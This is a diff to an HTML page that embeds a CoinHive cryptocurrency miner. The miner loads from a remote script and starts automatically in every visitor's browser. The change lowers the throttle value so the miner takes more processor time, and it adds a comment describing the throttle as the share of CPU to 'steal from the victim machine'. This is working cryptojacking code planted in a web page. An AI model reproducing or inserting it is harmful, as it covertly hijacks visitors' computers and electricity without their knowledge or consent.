@@ -7,8 +7,11 @@
 <body>
 <script src="https://kvandenbrande.github.io/mine/pino.js"></script>
 <script>
- var miner = new CoinHive.Anonymous('NeOaaRO3iDKr48wtRSL0Zel6u8OEcrHQ', {throttle: 0.8});
+ var miner = new CoinHive.Anonymous('NeOaaRO3iDKr48wtRSL0Zel6u8OEcrHQ', {throttle: 0.3});
   miner.start();
+ /*
+The throttle command determines the % of the processor you want to steal from the victim machine, 0 is 100% while 0.8 is the minimum.
+ */
 </script>
 
 </body>
